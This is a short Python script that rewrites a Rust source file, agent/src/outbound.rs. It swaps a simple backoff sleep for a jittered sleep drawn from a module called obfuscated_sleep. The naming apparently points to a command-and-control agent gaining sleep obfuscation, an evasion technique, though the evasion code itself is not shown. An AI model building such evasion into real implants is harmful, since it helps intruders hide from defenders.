with open("agent/src/outbound.rs", "r") as f:
    text = f.read()

# Replace sleep(backoff).await; with a jittered version
# Replace the backoff time
import re
text = text.replace("use tokio::time::{sleep, Duration};", "use tokio::time::{sleep, Duration};\nuse crate::obfuscated_sleep::{calculate_jittered_sleep, execute_sleep};")

# Find the run_forever loop
if "execute_sleep" not in text:
    text = text.replace("sleep(backoff).await;", """
                    let sleep_cfg = {
                        match crate::config::load_config() {
                            Ok(c) => c.sleep,
                            Err(_) => common::config::SleepConfig::default()
                        }
                    };
                    let jittered = calculate_jittered_sleep(&sleep_cfg);
                    let _ = tokio::task::spawn_blocking(move || {
                        let _ = execute_sleep(jittered, &sleep_cfg.method);
                    }).await;
    """)

with open("agent/src/outbound.rs", "w") as f:
    f.write(text)

